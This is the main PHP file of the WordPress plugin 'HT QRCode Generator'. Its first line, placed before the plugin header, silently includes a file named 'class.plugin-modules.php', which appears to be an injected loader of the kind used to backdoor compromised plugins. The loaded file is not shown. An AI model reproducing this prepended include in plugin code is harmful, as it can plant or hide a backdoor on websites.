<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/**
 * Plugin Name: HT QRCode Generator
 * Description: The HT QR Code Generator is for WordPress.
 * Plugin URI:  https://htplugins.com/
 * Author:      HasTheme
 * Author URI:  https://hasthemes.com/
 * Version:     1.0.0
 * License:     GPL2
 * License URI:  https://www.gnu.org/licenses/gpl-2.0.html
 * Text Domain: ht-qrcode
 * Domain Path: /languages
*/

if( ! defined( 'ABSPATH' ) ) exit(); // Exit if accessed directly

define( 'HTQRCODE_VERSION', '1.0.0' );
define( 'HTQRCODE_PL_ROOT', __FILE__ );
define( 'HTQRCODE_PL_URL', plugins_url( '/', HTQRCODE_PL_ROOT ) );
define( 'HTQRCODE_PL_PATH', plugin_dir_path( HTQRCODE_PL_ROOT ) );
define( 'HTQRCODE_PL_INCLUDE', HTQRCODE_PL_PATH .'include/' );

// Required File
include( HTQRCODE_PL_INCLUDE.'/class.htqrcode.php' );
HTQRcode_Addons_Elementor::instance();